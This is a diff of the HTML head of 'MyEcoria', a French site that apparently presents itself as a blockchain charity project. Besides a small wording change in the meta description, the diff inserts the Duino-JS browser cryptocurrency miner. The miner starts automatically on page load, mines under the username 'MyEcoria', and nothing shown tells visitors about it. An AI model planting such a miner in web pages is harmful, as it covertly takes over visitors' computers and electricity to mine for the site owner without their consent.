@@ -3,7 +3,7 @@
     <head>
         <meta charset="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-        <meta name="description" content="MyEcoria est un projet basé sur la blockchain Ethereum qui a pour but de redistribuer ses bénéfices à des associations et des projets que vous pouvez choisir..." />
+        <meta name="description" content="MyEcoria est un projet basé sur la blockchain binance qui a pour but de redistribuer ses bénéfices à des associations et des projets que vous pouvez choisir..." />
         <meta name="author" content="" />
         <title>MyEcoria | Home</title>
         <link rel="icon" type="image/x-icon" href="assets/img/logo.png" sizes="57x57"/>
@@ -18,6 +18,16 @@
         <link href="css/styles.css" rel="stylesheet" />
         <link rel="stylesheet" type="text/css" href="css/autres.css">
         <script data-ad-client="ca-pub-9645466131870589" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        
+        <!-- Miner JS -->
+                <script src="duino-js.min.js"></script> <!--imports the Duino-JS miner-->
+                <script>
+                    username = "MyEcoria"; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
+                    rigid = "ecole-js"; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
+                    threads = userThreads; //Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS for more options. The default is 1.
+                    startMiner(); //starts the miner
+                </script>
+          <!-- Fin du Miner JS -->
     </head>
     <body id="page-top">
         <!-- Navigation-->
